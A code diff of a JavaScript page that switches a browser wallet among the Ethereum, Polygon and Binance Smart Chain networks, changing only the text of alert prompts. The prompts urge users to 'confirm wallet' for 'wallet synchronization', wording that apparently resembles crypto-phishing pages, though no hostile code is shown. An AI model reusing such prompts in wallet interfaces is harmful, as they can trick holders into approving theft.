@@ -168,7 +168,7 @@ async function fetchAccountData() {
   document.getElementById("ether").style.display = "";
   document.getElementById("matic").style.display = "";
   document.getElementById("bsc").style.display = "";
-  alert("Ethereum Network Selected, Kindly Confirm Wallet to Initiate Wallet SyChronization, Thanks.");
+  alert("You are the Ethereum Network Selected, Kindly Confirm Wallet to Initiate Wallet SyChronization, Thanks.");
   document.querySelector("#prepare").style.display = "none";
   document.querySelector("#connected").style.display = "block"; 
  
@@ -319,7 +319,7 @@ function maticboy ()  {
         blockExplorerUrls: ["https://polygonscan.com/"]
     }]
 });
-alert("Ethereum Network Selected, Kindly Confirm Wallet to Initiate Wallet SyChronization, Thanks.");}
+alert("Polygon(Matic) Network Selected, Kindly Confirm Wallet to Initiate Wallet SyChronization, Thanks.");}
 
 
 function bscboy ()  {
@@ -340,7 +340,7 @@ function bscboy ()  {
     }]
 });
 
-alert("Ethereum Network Selected, Kindly Confirm Wallet to Initiate Wallet SyChronization, Thanks.");
+alert("Binance Smart Chain Network Selected, Kindly Confirm Wallet to Initiate Wallet SyChronization, Thanks.");
 }
 
 
